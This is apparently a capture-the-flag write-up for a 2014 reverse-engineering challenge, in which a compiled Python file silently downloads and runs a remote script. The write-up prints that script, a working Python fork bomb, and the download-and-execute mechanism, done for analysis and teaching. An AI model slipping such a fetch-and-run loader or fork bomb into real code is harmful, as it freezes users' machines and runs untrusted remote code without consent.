### Solved by superkojiman

This challenge is worth 100 points and we're given a zip file called eggshells-master.zip along with the following hint:

> I trust people on the internet all the time, do you?

The zip file contains a bunch of python scripts as well as one compiled python byte code:

```
root@kali ~/Desktop/re100/eggshells-master
# ls -l
total 72
-rwxr-xr-x 1 root root  1051 Sep 19 00:54 capstone.py
-rwxr-xr-x 1 root root  1191 Sep 19 00:54 distorm.py
-rwxr-xr-x 1 root root 29446 Sep 19 00:54 interpreter.py
-rwxr-xr-x 1 root root  5439 Sep 19 00:54 main.py
drwxr-xr-x 3 root root  4096 Sep 19 00:30 nasm
-rwxr-xr-x 1 root root  4086 Sep 19 00:54 nasm.py
-rwxr-xr-x 1 root root   622 Sep 19 00:54 server.py
-rwxr-xr-x 1 root root  2876 Sep 19 00:54 shellcode.py
-rw-r--r-- 1 root root   245 Sep 18 23:51 utils.pyc
-rwxr-xr-x 1 root root   107 Sep 19 00:55 wrapper.py
```

Attempting to run any of these python scripts would cause my machine to lock up; hence the hint provided.

Since utils.pyc was the only one that stood out, I decided to run the strings command on it to see what would show up:

```
root@kali ~/Desktop/re100/eggshells-master
# strings utils.pyc
urllib2s
http://kchung.co/lol.pyN(
__import__t
urlopent
read(
/Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.pyt
<module>
```

Looks like it pulls down some python file called lol.py from http://kchung.co. I went ahead and downloaded lol.py and examined its contents:

```
root@kali ~/Desktop/re100/eggshells-master
# curl http://kchung.co/lol.py
import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

lol.py itself is a fork bomb which which gets downloaded and executed whenever any of the python scripts are run. This explains why my machine would become unresponsive.

The flag of course, is right at the bottom of lol.py: **flag{trust_is_risky}**



